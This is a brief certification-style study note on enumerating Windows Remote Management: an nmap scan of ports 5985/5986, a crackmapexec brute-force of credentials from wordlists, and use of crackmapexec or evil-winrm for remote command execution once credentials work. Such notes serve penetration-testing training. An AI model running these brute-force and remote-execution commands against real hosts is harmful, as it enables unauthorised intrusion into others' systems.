---
title: "WinRM enumeration"
description: "Confirm WinRM is running and brute-force credentials for remote Windows management access."
pubDate: 2026-08-01
category: "Cybersecurity"
source: "INE Certification"
lang: "bash"
tags: ["winrm", "enumeration", "windows", "nmap","crackmapexec"]
draft: false
---

WinRM (Windows Remote Management) isn't enabled by default, so finding it listening at all is already a mild signal that the host is set up for remote administration which usually means remote command execution is a very good possibility if anything is misconfigured.

```bash
nmap -sS -sV -p5985,5986 <target_ip>          # 5985 = HTTP, 5986 = HTTPS

crackmapexec winrm <target_ip> -u username.txt -p passwords.txt
```

Once you have valid credentials, `crackmapexec winrm <target> -u <user> -p <pass> -x "<command>"` gives you remote command execution directly, or `evil-winrm` gets you a full interactive shell.
